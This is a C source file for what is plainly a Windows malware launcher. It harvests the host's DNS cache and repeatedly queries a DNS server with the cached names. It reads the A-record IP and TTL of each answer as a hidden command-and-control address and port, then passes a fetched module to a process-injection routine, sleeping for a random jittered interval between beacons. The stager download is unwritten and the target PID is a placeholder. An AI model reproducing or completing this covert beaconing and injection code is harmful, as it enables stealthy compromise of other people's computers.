// cl.exe -DDEBUG launcher.c loader.c
#include "launcher.h"

#define MAX_RECORDS 6
#define DNS_SERVER_IP L"127.0.0.1"
#define DNS_PORT 53

C2CHANNEL channel;

// int get_dns_cache(char record_names[][NI_MAXHOST], int *record_count)
// {
//     FILE *fp;
//     char path[1035];
//     int count = 0;

//     // Open the command for reading.
//     // TODO: RE ipconfig and perform this without popen
//     fp = _popen("ipconfig /displaydns", "r");
//     if (fp == NULL)
//     {
//         dprintf("Failed to run command\n");
//         return 1;
//     }

//     /* Read the output a line at a time - output it. */
//     while (fgets(path, sizeof(path) - 1, fp) != NULL && count < MAX_RECORDS)
//     {
//         if (strstr(path, "Record Name") != NULL)
//         {
//             sscanf(path, "    Record Name . . . . . : %s", record_names[count]);
//             count++;
//         }
//     }

//     *record_count = count;

//     /* Close the command. */
//     _pclose(fp);
//     return 0;
// }

// void build_dns_query(unsigned char *buf, const char *hostname, int *query_len)
// {
//     DNS_HEADER *dns = NULL;
//     QUESTION *qinfo = NULL;

//     dns = (DNS_HEADER *)buf;
//     dns->id = (unsigned short)htons(getpid());
//     dns->qr = 0;     // This is a query
//     dns->opcode = 0; // This is a standard query
//     dns->aa = 0;     // Not Authoritative
//     dns->tc = 0;     // This message is not truncated
//     dns->rd = 1;     // Recursion Desired
//     dns->ra = 0;     // Recursion not available! This is just a query
//     dns->z = 0;
//     dns->ad = 0;
//     dns->cd = 0;
//     dns->rcode = 0;
//     dns->q_count = htons(1); // we have only 1 question
//     dns->ans_count = 0;
//     dns->auth_count = 0;
//     dns->add_count = 0;

//     // point to the query portion
//     buf += sizeof(DNS_HEADER);

//     // convert hostname to DNS format
//     const char delim[2] = ".";
//     char *token;
//     char hostname_cpy[NI_MAXHOST];
//     strncpy(hostname_cpy, hostname, NI_MAXHOST);
//     token = strtok(hostname_cpy, delim);

//     while (token != NULL)
//     {
//         *buf++ = strlen(token);
//         for (int i = 0; i < strlen(token); i++)
//         {
//             *buf++ = token[i];
//         }
//         token = strtok(NULL, delim);
//     }

//     *buf++ = 0;

//     qinfo = (QUESTION *)buf;
//     qinfo->qtype = htons(1);  // type A query
//     qinfo->qclass = htons(1); // class IN

//     *query_len = sizeof(DNS_HEADER) + (strlen(hostname) + 2) + sizeof(QUESTION);
// }

// // Parses a dns response and sets the C2CHANNEL (IP and Port) global
// int parse_dns_response(unsigned char *buf, int recv_len)
// {
//     DNS_HEADER *dns = (DNS_HEADER *)buf;

//     int offset = sizeof(DNS_HEADER);

//     // Move past the DNS header
//     buf += offset;

//     // Skip over the questions section
//     for (int i = 0; i < ntohs(dns->q_count); ++i)
//     {
//         while (*buf != 0)
//         {
//             ++buf;
//         }
//         ++buf;                          // Move past the null-terminator of the domain name
//         buf += sizeof(struct QUESTION); // Move past the QTYPE and QCLASS fields
//     }

//     dprintf("BUF START: %02x %02x %02x\n", *buf, *(buf + 1), *(buf + 2));
//     // Parse answers
//     for (int i = 0; i < ntohs(dns->ans_count); ++i)
//     {
//         buf += 2;
//         dprintf("current buf bytes: %02x %02x %02x\n", *buf, *(buf + 1), *(buf + 2));
//         // Check if it's an IPv4 address (type A record)
//         if (*(buf + 1) == 0x01)
//         {
//             buf += 2; // Move past the type (2 bytes)
//             buf += 2; // Move past the class (2 bytes)
//             unsigned long ttl = ntohl(*(u_long*)(buf));
//             buf += 4; // Move past the TTL (4 bytes)
//             buf += 2; // Move past the data length (4 bytes)

//             // Extract the IPv4 address (4 bytes)
//             struct in_addr ipv4;
//             memcpy(&ipv4, buf, sizeof(struct in_addr));
            
//             // This means that IP has already been allocated and needs to be free'd
//             if (channel.c2_server_ip)
//             {
//                 free(channel.c2_server_ip);
//             }
//             channel.c2_server_ip = strdup(inet_ntoa(ipv4));
//             channel.c2_server_port = ttl;

//             dprintf("IPv4 Address: %s\n", channel.c2_server_ip);
//             dprintf("TTL: %lu\n", channel.c2_server_port);

//             if (channel.c2_server_ip && channel.c2_server_port)
//             {
//                 return 1;
//             }

//             // Move to the next answer
//             buf += sizeof(struct in_addr);
//         }
//         else if (*(buf + 1) == 0x05)
//         {
//             // It's a CNAME record
//             buf += 2;                // Move past the type
//             buf += 2;                // Move past the class
//             buf += 4;                // Move past the TTL
//             int length = *(buf + 1); // Length of the CNAME
//             buf += length + 2;       // Move past the CNAME + length
//         }
//     }
//     return 0;
// }

// void perform_dns_query(const char *hostname)
// {
//     struct sockaddr_in dest;
//     unsigned char buf[65536], *qname;
//     int query_len, sockfd;
//     struct sockaddr_in from;
//     int from_len = sizeof(from);

//     // Create a UDP socket
//     sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
//     if (sockfd == INVALID_SOCKET)
//     {
//         dprintf("Socket creation failed.\n");
//         return;
//     }

//     // Configure the DNS server address
//     dest.sin_family = AF_INET;
//     dest.sin_port = htons(DNS_PORT);
//     dest.sin_addr.s_addr = inet_addr(DNS_SERVER_IP);

//     // Build the DNS query
//     memset(buf, 0, sizeof(buf));
//     build_dns_query(buf, hostname, &query_len);

//     // Send the DNS query
//     if (sendto(sockfd, (char *)buf, query_len, 0, (struct sockaddr *)&dest, sizeof(dest)) == SOCKET_ERROR)
//     {
//         dprintf("DNS request to %s failed.\n", DNS_SERVER_IP);
//         closesocket(sockfd);
//         return;
//     }

//     // Receive the DNS response
//     int recv_len = recvfrom(sockfd, (char *)buf, sizeof(buf), 0, (struct sockaddr *)&from, &from_len);
//     if (recv_len == SOCKET_ERROR)
//     {
//         dprintf("DNS request to %s failed.\n", DNS_SERVER_IP);
//     }
//     else
//     {
//         dprintf("DNS request to %s succeeded. Received %d bytes of data:\n", hostname, recv_len);
//         // Print the received data (in hex format)
//         dprintf("%p] ", buf);
//         for (int i = 0; i < recv_len; ++i)
//         {
//             dprintf("%02X ", buf[i]);
//             if ((i + 1) % 16 == 0) // New line every 16 bytes
//                 dprintf("\n%p] ", &(buf[i]));
//         }
//         dprintf("\n");
//         // Success (1) means we got C2 information
//         if (parse_dns_response(buf, recv_len))
//         {
//             // HMODULE hModule = get_module_to_load();
//             // inject(hModule);
//         }
//     }

//     closesocket(sockfd);
// }
// #include <IPExport.h>

int get_dns_cache(char record_names[][NI_MAXHOST], int *record_count)
{
    int count = 0;
    PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY));

    int stat = DnsGetCacheDataTable(pEntry);

    pEntry = pEntry->pNext;
    while(pEntry && (count < MAX_RECORDS))
    {
        dprintf("%ws\n", pEntry->pszName);
        wcsncpy((wchar_t*)record_names[count], pEntry->pszName, NI_MAXHOST/2);
        // strncpy(record_names[count], pEntry->pszName, NI_MAXHOST);
        pEntry = pEntry->pNext;
        count++;

    }
    *record_count = count;
    free(pEntry);
    dprintf("Returning, last entry %d: %ws\n", count, (PCWSTR)(record_names[count-1]));
    return 0;
}

void perform_dns_query(PCWSTR Name)
{
    PCWSTR Server = DNS_SERVER_IP;
    WORD Type = DNS_TYPE_A;
    DWORD Options = DNS_QUERY_BYPASS_CACHE;

    DNS_STATUS Status = ERROR_SUCCESS;
    IP4_ARRAY DnsServerList;
    RtlZeroMemory(&DnsServerList, sizeof(DnsServerList));
    DnsServerList.AddrCount = 1;
    InetPtonW(AF_INET, Server, &DnsServerList.AddrArray[0]);
    PDNS_RECORD QueryResult = NULL;
 
    Status = DnsQuery_W(Name, Type, Options, &DnsServerList, &QueryResult, NULL);
 
    for (PDNS_RECORD DnsRecord = QueryResult; DnsRecord; DnsRecord = DnsRecord->pNext)
    {
        // dprintf("Name: %ls\n", DnsRecord->pName);
        // wprintf_s(L"Type:       %u\n", DnsRecord->wType);
        // wprintf_s(L"DataLength: %u\n", DnsRecord->wDataLength);
        // wprintf_s(L"Flags:      0x%X\n", DnsRecord->Flags.DW);
        // dprintf("TTL: %u\n", DnsRecord->dwTtl);
        // wprintf_s(L"Reserved:   %u\n", DnsRecord->dwReserved);
        if (DnsRecord->wType == DNS_TYPE_A)
        {
            // WCHAR Buffer[INET_ADDRSTRLEN];
            // RtlIpv4AddressToStringW((struct in_addr*)(&DnsRecord->Data.A.IpAddress), Buffer);
            // wprintf_s(L"Address:    %ls\n", Buffer);

            struct in_addr ipv4;
            memcpy(&ipv4, &DnsRecord->Data.A.IpAddress, sizeof(struct in_addr));
            
            // This means that IP has already been allocated and needs to be free'd
            if (channel.c2_server_ip)
            {
                free(channel.c2_server_ip);
            }
            channel.c2_server_ip = strdup(inet_ntoa(ipv4));
            channel.c2_server_port = DnsRecord->dwTtl;

            dprintf("IPv4 Address: %s\n", channel.c2_server_ip);
            dprintf("TTL: %lu\n", channel.c2_server_port);
        }
    }
    DnsRecordListFree(QueryResult, DnsFreeRecordList);
}

int main(int argc, char **argv)
{
    WSADATA wsaData;
    char record_names[MAX_RECORDS][NI_MAXHOST];
    int record_count   = 0;
    int current_record = 0;

    channel.c2_server_ip = NULL;
    channel.c2_server_port = 0;

    unsigned long sleep_min = 1000;
    unsigned long sleep_max = 5000;

    // Get DNS cache and extract record names
    while (!record_count)
    {
        get_dns_cache(record_names, &record_count);
    }

    // Initialize Winsock
    // if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    // {
    //     dprintf("WSAStartup failed.\n");
    //     return;
    // }

    // Perform DNS requests in a loop
    while (1)
    {
        dprintf("Performing DNS request for: %ws\n", (PCWSTR)record_names[current_record]);
        perform_dns_query((PCWSTR)(record_names[current_record]));
        if (channel.c2_server_port > 0)
        {
            // We successfully received a stager server info
            unsigned long buffer_len;
            unsigned char* buffer;
            // Still have to write this code:
            // buffer = get_module_from_stager(channel.c2_server_ip, channel.c2_server_port, &buffer_len);
            int PID = 4; // TODO
            inject(PID, buffer, buffer_len);
        }

        // Move to the next record
        current_record = (current_record + 1) % record_count;

        // Pause between requests
        Sleep(JITTER(sleep_min, sleep_max));
    }
    // WSACleanup();

    return 0;
}